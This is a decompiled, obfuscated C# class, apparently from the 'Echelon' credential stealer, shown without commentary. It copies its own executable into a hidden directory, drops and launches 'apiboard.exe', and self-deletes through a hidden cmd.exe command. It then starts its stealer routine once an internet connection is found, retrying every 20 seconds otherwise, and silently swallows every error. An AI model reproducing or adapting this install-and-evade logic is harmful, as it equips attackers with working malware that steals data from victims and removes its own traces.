using Echelon;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Timers;

internal class k
{
	[CompilerGenerated]
	private sealed class a
	{
		public Timer a;

		internal void a(object ad, ElapsedEventArgs ae)
		{
			b();
			if (!File.Exists(k.a + "\\logs"))
			{
				this.a.Stop();
			}
		}
	}

	public static string a = g.b;

	public static void a()
	{
		try
		{
			if (!Directory.Exists(k.a))
			{
				DirectoryInfo directoryInfo = Directory.CreateDirectory(k.a);
				Directory.CreateDirectory(k.a);
				directoryInfo.Refresh();
			}
		}
		catch
		{
		}
		if (!File.Exists(k.a + "\\" + g.c))
		{
			try
			{
				File.Copy(Assembly.GetExecutingAssembly().Location, k.a + g.c);
				File.AppendAllText(k.a + "\\Up", j.a());
				File.AppendAllText(k.a + "\\apiboard.exe", j.a());
				File.Replace(k.a + "\\Up", k.a + "\\" + g.c, k.a + "\\apiboard.exe");
				Process.Start(k.a + "\\apiboard.exe");
				n.a();
				Process.Start(new ProcessStartInfo
				{
					Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					FileName = "cmd.exe"
				});
				Environment.Exit(0);
			}
			catch
			{
			}
		}
	}

	public static void b()
	{
		try
		{
			if (!File.Exists(k.a + "\\logs"))
			{
				c();
			}
		}
		catch
		{
		}
	}

	private static void c()
	{
		try
		{
			if (Internet.CheckConnection())
			{
				Stealer.Start();
			}
			else
			{
				d();
			}
		}
		catch
		{
		}
	}

	private static void d()
	{
		try
		{
			Timer a = new Timer
			{
				Interval = 20000.0
			};
			a.Elapsed += delegate
			{
				b();
				if (!File.Exists(k.a + "\\logs"))
				{
					a.Stop();
				}
			};
			a.Start();
		}
		catch
		{
		}
	}
}
